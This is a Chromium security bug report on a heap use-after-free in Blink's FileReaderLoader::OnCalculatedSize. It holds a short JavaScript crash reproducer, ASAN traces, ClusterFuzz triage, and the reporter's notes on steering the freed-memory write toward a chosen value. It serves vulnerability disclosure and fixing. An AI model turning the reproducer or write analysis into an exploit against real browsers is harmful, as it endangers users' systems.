# Security: FileReader - Use After Free in FileReaderLoader::OnCalculatedSize()

| Field | Value |
|-------|-------|
| **Issue ID** | [40091179](https://issues.chromium.org/issues/40091179) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>Storage>FileAPI |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | lo...@gmail.com |
| **Assignee** | me...@chromium.org |
| **Created** | 2018-04-22 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**

```
Steps to reproduce:  
  
1.Open PoC UAF_OnCalculatedSize_PoC.html in Chrome browser ASAN Build.  
2.ASAN reports a Use After Free in FileReaderLoader::OnCalculatedSize().  

	==13480==ERROR: AddressSanitizer: heap-use-after-free on address 0x125ad07b4348 at pc 0x7ff941011e71 bp 0x00a10f3fb3e0 sp 0x00a10f3fb428  
	WRITE of size 1 at 0x125ad07b4348 thread T0  

		#0 0x7ff941011e70 in blink::FileReaderLoader::OnCalculatedSize C:\b\c\b\win_asan_release\src\third_party\blink\renderer\core\fileapi\file_reader_loader.cc:283  

```

**VERSION**  

Chrome Version: Chromium 68.0.3404.0 (Developer Build) (64-bit)  

Operating System: Windows 10

**REPRODUCTION CASE** (UAF\_OnCalculatedSize\_PoC.html)  

<script>  

var reader = new FileReader();  

reader.onloadstart = function(e) {  

reader.abort();  

reader.readAsDataURL(new Blob([""], {type : "text/html"}));  

}  

reader.readAsText(new Blob([""], {type : "text/html"}));  

</script>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

```
==13480==ERROR: AddressSanitizer: heap-use-after-free on address 0x125ad07b4348 at pc 0x7ff941011e71 bp 0x00a10f3fb3e0 sp 0x00a10f3fb428  
WRITE of size 1 at 0x125ad07b4348 thread T0  

	#0 0x7ff941011e70 in blink::FileReaderLoader::OnCalculatedSize C:\b\c\b\win_asan_release\src\third_party\blink\renderer\core\fileapi\file_reader_loader.cc:283  
	#1 0x7ff93608751c in blink::mojom::blink::BlobReaderClientStubDispatch::Accept C:\b\c\b\win_asan_release\src\out\release_x64\gen\third_party\blink\public\mojom\blob\blob.mojom-blink.cc:133  
	#2 0x7ff938ac93a7 in mojo::InterfaceEndpointClient::HandleValidatedMessage C:\b\c\b\win_asan_release\src\mojo\public\cpp\bindings\lib\interface_endpoint_client.cc:419  
	#3 0x7ff938ab20bf in mojo::internal::MultiplexRouter::ProcessIncomingMessage C:\b\c\b\win_asan_release\src\mojo\public\cpp\bindings\lib\multiplex_router.cc:865  
	#4 0x7ff938ab1000 in mojo::internal::MultiplexRouter::Accept C:\b\c\b\win_asan_release\src\mojo\public\cpp\bindings\lib\multiplex_router.cc:589  
	#5 0x7ff938ac27f3 in mojo::Connector::ReadSingleMessage C:\b\c\b\win_asan_release\src\mojo\public\cpp\bindings\lib\connector.cc:443  
	#6 0x7ff938ac3d5e in mojo::Connector::ReadAllAvailableMessages C:\b\c\b\win_asan_release\src\mojo\public\cpp\bindings\lib\connector.cc:472  
	#7 0x7ff938af8fed in mojo::SimpleWatcher::OnHandleReady C:\b\c\b\win_asan_release\src\mojo\public\cpp\system\simple_watcher.cc:273  
	#8 0x7ff9389cb661 in base::debug::TaskAnnotator::RunTask C:\b\c\b\win_asan_release\src\base\debug\task_annotator.cc:101  
	#9 0x7ff9380fff3c in blink::scheduler::internal::ThreadControllerImpl::DoWork C:\b\c\b\win_asan_release\src\third_party\blink\renderer\platform\scheduler\base\thread_controller_impl.cc:162  
	#10 0x7ff9389cb661 in base::debug::TaskAnnotator::RunTask C:\b\c\b\win_asan_release\src\base\debug\task_annotator.cc:101  
	#11 0x7ff9388db3cd in base::MessageLoop::RunTask C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:319  
	#12 0x7ff9388dc7b7 in base::MessageLoop::DoWork C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:373  
	#13 0x7ff938a37328 in base::MessagePumpDefault::Run C:\b\c\b\win_asan_release\src\base\message_loop\message_pump_default.cc:37  
	#14 0x7ff9388c4d14 in base::RunLoop::Run C:\b\c\b\win_asan_release\src\base\run_loop.cc:130  
	#15 0x7ff93df09859 in content::RendererMain C:\b\c\b\win_asan_release\src\content\renderer\renderer_main.cc:250  
	#16 0x7ff9387dbda9 in content::RunNamedProcessTypeMain C:\b\c\b\win_asan_release\src\content\app\content_main_runner.cc:633  
	#17 0x7ff9387dcf2e in content::ContentMainRunnerImpl::Run C:\b\c\b\win_asan_release\src\content\app\content_main_runner.cc:922  
	#18 0x7ff9387fca6c in service_manager::Main C:\b\c\b\win_asan_release\src\services\service_manager\embedder\main.cc:452  
	#19 0x7ff9387db986 in content::ContentMain C:\b\c\b\win_asan_release\src\content\app\content_main.cc:19  
	#20 0x7ff9344c1311 in ChromeMain C:\b\c\b\win_asan_release\src\chrome\app\chrome_main.cc:101  
	#21 0x7ff7e7747cd6 in MainDllLoader::Launch C:\b\c\b\win_asan_release\src\chrome\app\main_dll_loader_win.cc:200  
	#22 0x7ff7e774236a in main C:\b\c\b\win_asan_release\src\chrome\app\chrome_exe_main_win.cc:230  
	#23 0x7ff7e7a87638 in __scrt_common_main_seh f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl:283  
	#24 0x7ff9da8d1fe3 in BaseThreadInitThunk+0x13 (C:\WINDOWS\System32\KERNEL32.DLL+0x11fe3)  
	#25 0x7ff9dd32f060 in RtlUserThreadStart+0x20 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x6f060)  

0x125ad07b4348 is located 264 bytes inside of 272-byte region [0x125ad07b4240,0x125ad07b4350)  
freed by thread T0 here:  
	#0 0x7ff7e777a930 in free C:\b\rr\tmpf1ermk\w\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_malloc_win.cc:44  
	#1 0x7ff9410126c3 in blink::FileReaderLoader::~FileReaderLoader C:\b\c\b\win_asan_release\src\third_party\blink\renderer\core\fileapi\file_reader_loader.cc:80  
	#2 0x7ff941014d50 in blink::FileReader::ExecutePendingRead C:\b\c\b\win_asan_release\src\third_party\blink\renderer\core\fileapi\file_reader.cc:313  
	#3 0x7ff94101abb1 in blink::FileReader::ThrottlingController::PushReader C:\b\c\b\win_asan_release\src\third_party\blink\renderer\core\fileapi\file_reader.cc:137  
	#4 0x7ff941014aed in blink::FileReader::ThrottlingController::PushReader C:\b\c\b\win_asan_release\src\third_party\blink\renderer\core\fileapi\file_reader.cc:100  
	#5 0x7ff94101447d in blink::FileReader::ReadInternal C:\b\c\b\win_asan_release\src\third_party\blink\renderer\core\fileapi\file_reader.cc:306  
	#6 0x7ff94029a324 in blink::V8FileReader::readAsDataURLMethodCallback C:\b\c\b\win_asan_release\src\out\release_x64\gen\third_party\blink\renderer\bindings\core\v8\v8_file_reader.cc:508  
	#7 0x7ff9362cfa87 in v8::internal::FunctionCallbackArguments::Call C:\b\c\b\win_asan_release\src\v8\src\api-arguments-inl.h:93  
	#8 0x7ff9362cc544 in v8::internal::`anonymous namespace'::HandleApiCallHelper<0> C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:107  
	#9 0x7ff9362c935b in v8::internal::Builtin_Impl_HandleApiCall C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:137  
	#10 0x7ff9362c86a6 in v8::internal::Builtin_HandleApiCall C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:125  
	#11 0x12b6d8404240  (<unknown module>)  

previously allocated by thread T0 here:  
	#0 0x7ff7e777aa10 in malloc C:\b\rr\tmpf1ermk\w\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_malloc_win.cc:60  
	#1 0x7ff935f8d983 in WTF::Partitions::FastMalloc C:\b\c\b\win_asan_release\src\third_party\blink\renderer\platform\wtf\allocator\partitions.h:121  
	#2 0x7ff94100d871 in blink::FileReaderLoader::Create C:\b\c\b\win_asan_release\src\third_party\blink\renderer\core\fileapi\file_reader_loader.cc:68  
	#3 0x7ff941014cbf in blink::FileReader::ExecutePendingRead C:\b\c\b\win_asan_release\src\third_party\blink\renderer\core\fileapi\file_reader.cc:313  
	#4 0x7ff94101abb1 in blink::FileReader::ThrottlingController::PushReader C:\b\c\b\win_asan_release\src\third_party\blink\renderer\core\fileapi\file_reader.cc:137  
	#5 0x7ff941014aed in blink::FileReader::ThrottlingController::PushReader C:\b\c\b\win_asan_release\src\third_party\blink\renderer\core\fileapi\file_reader.cc:100  
	#6 0x7ff94101447d in blink::FileReader::ReadInternal C:\b\c\b\win_asan_release\src\third_party\blink\renderer\core\fileapi\file_reader.cc:306  
	#7 0x7ff9410148ec in blink::FileReader::readAsText C:\b\c\b\win_asan_release\src\third_party\blink\renderer\core\fileapi\file_reader.cc:258  
	#8 0x7ff940299c0b in blink::V8FileReader::readAsTextMethodCallback C:\b\c\b\win_asan_release\src\out\release_x64\gen\third_party\blink\renderer\bindings\core\v8\v8_file_reader.cc:503  
	#9 0x7ff9362cfa87 in v8::internal::FunctionCallbackArguments::Call C:\b\c\b\win_asan_release\src\v8\src\api-arguments-inl.h:93  
	#10 0x7ff9362cc544 in v8::internal::`anonymous namespace'::HandleApiCallHelper<0> C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:107  
	#11 0x7ff9362c935b in v8::internal::Builtin_Impl_HandleApiCall C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:137  
	#12 0x7ff9362c86a6 in v8::internal::Builtin_HandleApiCall C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:125  
	#13 0x12b6d8404240  (<unknown module>)  

SUMMARY: AddressSanitizer: heap-use-after-free C:\b\c\b\win_asan_release\src\third_party\blink\renderer\core\fileapi\file_reader_loader.cc:283 in blink::FileReaderLoader::OnCalculatedSize  
Shadow bytes around the buggy address:  
  0x04822a876810: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00  
  0x04822a876820: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  
  0x04822a876830: 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa  
  0x04822a876840: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd  
  0x04822a876850: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  
=>0x04822a876860: fd fd fd fd fd fd fd fd fd[fd]fa fa fa fa fa fa  
  0x04822a876870: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd  
  0x04822a876880: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  
  0x04822a876890: fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa  
  0x04822a8768a0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd  
  0x04822a8768b0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  
Shadow byte legend (one shadow byte represents 8 application bytes):  
  Addressable:           00  
  Partially addressable: 01 02 03 04 05 06 07   
  Heap left redzone:       fa  
  Freed heap region:       fd  
  Stack left redzone:      f1  
  Stack mid redzone:       f2  
  Stack right redzone:     f3  
  Stack after return:      f5  
  Stack use after scope:   f8  
  Global redzone:          f9  
  Global init order:       f6  
  Poisoned by user:        f7  
  Container overflow:      fc  
  Array cookie:            ac  
  Intra object redzone:    bb  
  ASan internal:           fe  
  Left alloca redzone:     ca  
  Right alloca redzone:    cb  
==13480==ABORTING

```

## Attachments

- [UAF_OnCalculatedSize_PoC.html](attachments/UAF_OnCalculatedSize_PoC.html) (text/plain, 224 B)
- [UAF_OnCalculatedSize_PoC_WrittenValue_0x414141.html](attachments/UAF_OnCalculatedSize_PoC_WrittenValue_0x414141.html) (text/plain, 296 B)

## Timeline

### lo...@gmail.com (2018-04-22)

This issue affects Beta and Stable.

Ran the same test case in the official Linux ASAN build downloaded from https://www.googleapis.com/download/storage/v1/b/chromium-browser-asan/o/linux-release%2Fasan-linux-beta-66.0.3359.117.zip?generation=1524048155366515&alt=media , which has the same build name with current Stable version, I got:


Chromium	66.0.3359.117 (Developer Build) (64-bit)


=================================================================
==1==ERROR: AddressSanitizer: heap-use-after-free on address 0x612000030750 at pc 0x5579d590be19 bp 0x7ffc90b0a0b0 sp 0x7ffc90b0a0a8
WRITE of size 8 at 0x612000030750 thread T0 (chrome)
    #0 0x5579d590be18  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x18310e18)
    #1 0x5579ca95a861  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xd35f861)
    #2 0x5579cce4f07e  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xf85407e)
    #3 0x5579cce5fb4c  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xf864b4c)
    #4 0x5579cce5e324  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xf863324)
    #5 0x5579cce4881b  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xf84d81b)
    #6 0x5579cce49fec  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xf84efec)
    #7 0x5579cce3caed  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xf841aed)
    #8 0x5579cb9adec0  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xe3b2ec0)
    #9 0x5579cab1f465  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xd524465)
    #10 0x5579cb9adec0  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xe3b2ec0)
    #11 0x5579cba0fbd5  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xe414bd5)
    #12 0x5579cba10e84  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xe415e84)
    #13 0x5579cba185bf  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xe41d5bf)
    #14 0x5579cba92901  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xe497901)
    #15 0x5579d90c6d6c  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x1bacbd6c)
    #16 0x5579cafae2f8  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xd9b32f8)
    #17 0x5579cafb1192  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xd9b6192)
    #18 0x5579cafd550b  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xd9da50b)
    #19 0x5579cafadbb8  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xd9b2bb8)
    #20 0x5579c4bc44a6  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x75c94a6)
    #21 0x7f8249da582f  (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)

0x612000030750 is located 272 bytes inside of 288-byte region [0x612000030640,0x612000030760)
freed by thread T0 (chrome) here:
    #0 0x5579c4b965f2  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x759b5f2)
    #1 0x5579d58fdec2  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x18302ec2)
    #2 0x5579d5904ef6  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x18309ef6)
    #3 0x5579d58fd962  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x18302962)
    #4 0x5579d5122291  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x17b27291)
    #5 0x5579c8eff112  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xb904112)
    #6 0x5579c90a2bc9  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xbaa7bc9)
    #7 0x5579c90a072e  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xbaa572e)
    #8 0x7eb6fbc043dc  (<unknown module>)
    #9 0x7eb6fbc145f6  (<unknown module>)
    #10 0x7eb6fbc119d4  (<unknown module>)
    #11 0x7eb6fbc06020  (<unknown module>)
    #12 0x5579c98ec0c4  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xc2f10c4)
    #13 0x5579c98eb873  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xc2f0873)
    #14 0x5579c8f578bd  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xb95c8bd)
    #15 0x5579d41416ba  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x16b466ba)
    #16 0x5579d4166f8d  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x16b6bf8d)
    #17 0x5579d41682a6  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x16b6d2a6)
    #18 0x5579d4167c9b  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x16b6cc9b)
    #19 0x5579d4167973  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x16b6c973)
    #20 0x5579d5564532  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x17f69532)
    #21 0x5579d55625b9  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x17f675b9)
    #22 0x5579d55621fb  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x17f671fb)
    #23 0x5579d58feba6  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x18303ba6)
    #24 0x5579d58fefc8  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x18303fc8)
    #25 0x5579d59078a9  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x1830c8a9)
    #26 0x5579d590bb63  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x18310b63)
    #27 0x5579ca95a861  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xd35f861)
    #28 0x5579cce4f07e  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xf85407e)
    #29 0x5579cce5fb4c  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xf864b4c)

previously allocated by thread T0 (chrome) here:
    #0 0x5579c4b96933  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x759b933)
    #1 0x5579d59068aa  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x1830b8aa)
    #2 0x5579d58fde26  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x18302e26)
    #3 0x5579d5904ef6  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x18309ef6)
    #4 0x5579d58fd962  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x18302962)
    #5 0x5579d5121c90  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x17b26c90)
    #6 0x5579c8eff112  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xb904112)
    #7 0x5579c90a2bc9  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xbaa7bc9)
    #8 0x5579c90a072e  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xbaa572e)
    #9 0x7eb6fbc043dc  (<unknown module>)
    #10 0x7eb6fbc145f6  (<unknown module>)
    #11 0x7eb6fbc119d4  (<unknown module>)
    #12 0x7eb6fbc06020  (<unknown module>)
    #13 0x5579c98ec0c4  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xc2f10c4)
    #14 0x5579c98eb873  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xc2f0873)
    #15 0x5579c8f1c29d  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xb92129d)
    #16 0x5579d413d6df  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x16b426df)
    #17 0x5579d417b433  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x16b80433)
    #18 0x5579d417d74a  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x16b8274a)
    #19 0x5579d417dfe6  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x16b82fe6)
    #20 0x5579d7026ede  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x19a2bede)
    #21 0x5579d7022399  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x19a27399)
    #22 0x5579d6fea976  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x199ef976)
    #23 0x5579d6fea2bc  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x199ef2bc)
    #24 0x5579d5d38acd  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x1873dacd)
    #25 0x5579d5d33c0a  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x18738c0a)
    #26 0x5579d3d08b3a  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x1670db3a)
    #27 0x5579cb9adec0  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xe3b2ec0)
    #28 0x5579cab1f465  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xd524465)
    #29 0x5579cb9adec0  (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0xe3b2ec0)

SUMMARY: AddressSanitizer: heap-use-after-free (/home/thecoder/ChromeBuilds/asan-linux-beta-66.0.3359.117/chrome+0x18310e18) 
Shadow bytes around the buggy address:
  0x0c247fffe090: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
  0x0c247fffe0a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c247fffe0b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa
  0x0c247fffe0c0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
  0x0c247fffe0d0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
=>0x0c247fffe0e0: fd fd fd fd fd fd fd fd fd fd[fd]fd fa fa fa fa
  0x0c247fffe0f0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
  0x0c247fffe100: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c247fffe110: fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa
  0x0c247fffe120: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
  0x0c247fffe130: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==1==ABORTING


### cl...@chromium.org (2018-04-23)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5674396262596608.

### va...@chromium.org (2018-04-23)

[Empty comment from Monorail migration]

### va...@chromium.org (2018-04-23)

[Empty comment from Monorail migration]

[Monorail components: Blink>FileAPI]

### va...@chromium.org (2018-04-23)

[Empty comment from Monorail migration]

### va...@chromium.org (2018-04-23)

[Empty comment from Monorail migration]

### cl...@chromium.org (2018-04-23)

Detailed report: https://clusterfuzz.com/testcase?key=5674396262596608

Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free WRITE 1
Crash Address: 0x613000049608
Crash State:
  blink::FileReaderLoader::OnCalculatedSize
  blink::mojom::blink::BlobReaderClientStubDispatch::Accept
  mojo::InterfaceEndpointClient::HandleValidatedMessage
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=523898:523900

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5674396262596608

See https://github.com/google/clusterfuzz-tools for more information.

The recommended severity is different from what was assigned to the bug. Please double check the accuracy of the assigned severity.


### cl...@chromium.org (2018-04-23)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the Test-Predator-Wrong-Components label.

[Monorail components: Internals>Mojo]

### lo...@gmail.com (2018-04-23)

It's worse in Stable and Beta.
In stable and beta, there is a byte member variable expected_content_size_ and it can corrupt multiple bytes of the freed memory:

	void FileReaderLoader::OnCalculatedSize(uint64_t total_size,
											uint64_t expected_content_size) {
	  OnStartLoading(expected_content_size);
	  expected_content_size_ = expected_content_size; // <--- 8 byte write
	  if (expected_content_size_ == 0) {
		received_all_data_ = true;
		return;
	  }

In DEV channel, expected_content_size_ no longer exists, the most easy write to trigger is one byte write to received_all_data_:
	void FileReaderLoader::OnCalculatedSize(uint64_t total_size,
											uint64_t expected_content_size) {
	  OnStartLoading(expected_content_size);
	  if (expected_content_size == 0) {
		received_all_data_ = true;  // <---------- 1 byte write
		return;
	  }


Attached a PoC (UAF_OnCalculatedSize_PoC_WrittenValue_0x414141.html) that can write 0x414141 into the freed memory in Stable and Beta:

Chromium	67.0.3365.0 (Developer Build) (32-bit) 
OS: Windows 10

Memory block of FileReaderLoader before it's freed.


	0x57284390  5c 57 03 2b 02 00 00 00 30 f1 d4 58 00 00 00 00  \W.+....0ñÔX....
	0x572843A0  20 62 86 38 00 00 00 00 00 ab ab ab 00 00 00 00   b.8.....«««....
	0x572843B0  00 00 00 00 00 00 00 00 18 fa 4a 2d 00 00 00 00  .........úJ-....
	0x572843C0  00 00 00 00 00 ab ab ab 00 00 00 00 00 00 00 00  .....«««........
	0x572843D0  ff ff ff ff ff ff ff ff 00 00 00 00 00 00 00 00  ÿÿÿÿÿÿÿÿ........
	0x572843E0  00 00 00 00 3f 01 00 00 00 00 00 00 00 00 00 00  ....?...........
	0x572843F0  90 6a f9 39 00 00 00 00 40 24 76 03 01 ab ab ab  .jù9....@$v..«««
	0x57284400  3c 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00  <...............
	0x57284410  00 00 00 00 00 ab ab ab 6a 57 03 2b 00 00 00 00  .....«««jW.+....
	0x57284420  e8 43 28 57 30 42 9d 36 90 5c 9d 36 00 00 00 00  èC(W0B.6.\.6....
	0x57284430  24 44 28 57 f4 58 03 2b 90 43 28 57 ab ab ab ab  $D(WôX.+.C(W««««
	0x57284440  ff ff ff ff ff ff ff ff 00 00 01 ab ab ab ab ab  ÿÿÿÿÿÿÿÿ...«««««
	0x57284450  de ad be ef ca fe d0 0d 13 37 f0 05 ba 11 ab 1e  Þ..ïÊþÐ..7ð.º.«.
	0x57284460  57 28 45 40 00 00 00 00 00 00 00 00 00 00 00 00  W(E@............
	0x57284470  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................

	-		this	0x57284390 {read_type_=kReadAsText (0x00000002) client_=0x58d4f130 {mixin_constructor_marker_={...} ...} ...}	blink::FileReaderLoader *
	+		blink::mojom::blink::BlobReaderClient	{...}	blink::mojom::blink::BlobReaderClient
			read_type_	kReadAsText (0x00000002)	blink::FileReaderLoader::ReadType
	+		client_	0x58d4f130 {mixin_constructor_marker_={...} state_=kLoading (0x00000001) loading_state_=kLoadingStateLoading (0x00000002) ...}	blink::FileReaderLoaderClient * {blink::FileReader}
	+		encoding_	{name_=0x00000000 <NULL> }	WTF::TextEncoding
	+		data_type_	[0x00000018] "application/octet-binary"	WTF::String
	+		raw_data_	empty	std::unique_ptr<WTF::ArrayBufferBuilder,std::default_delete<WTF::ArrayBufferBuilder> >
			is_raw_data_converted_	false	bool
	+		array_buffer_result_	null	blink::Persistent<blink::DOMArrayBuffer>
	+		string_result_	(null)	WTF::String
	+		decoder_	empty	std::unique_ptr<blink::TextResourceDecoder,std::default_delete<blink::TextResourceDecoder> >
			finished_loading_	false	bool
			bytes_loaded_	0x0000000000000000	__int64
			total_bytes_	0xffffffffffffffff	__int64
			memory_usage_reported_to_v8_	0x0000000000000000	__int64
			error_code_	kOK (0x00000000)	blink::FileError::ErrorCode
	+		consumer_handle_	{handle_={...} }	mojo::ScopedHandleBase<mojo::DataPipeConsumerHandle>
	+		handle_watcher_	{sequence_checker_={...} arming_policy_=AUTOMATIC (0x00000000) task_runner_=[0x2d180760] 0x03762440 {queue_type_=kDefault (0x00000001) queue_class_=kNone (0x00000000) can_be_blocked_=false ...} ...}	mojo::SimpleWatcher
	+		binding_	{internal_state_={stub_={sink_=0x57284390 {read_type_=kReadAsText (0x00000002) client_=0x58d4f130 {mixin_constructor_marker_=...} ...} } } }	mojo::Binding<blink::mojom::blink::BlobReaderClient,mojo::RawPtrImplRefTraits<blink::mojom::blink::BlobReaderClient> >
			expected_content_size_	0xffffffffffffffff	__int64
			received_all_data_	false	bool
			received_on_complete_	false	bool
			started_loading_	true	bool
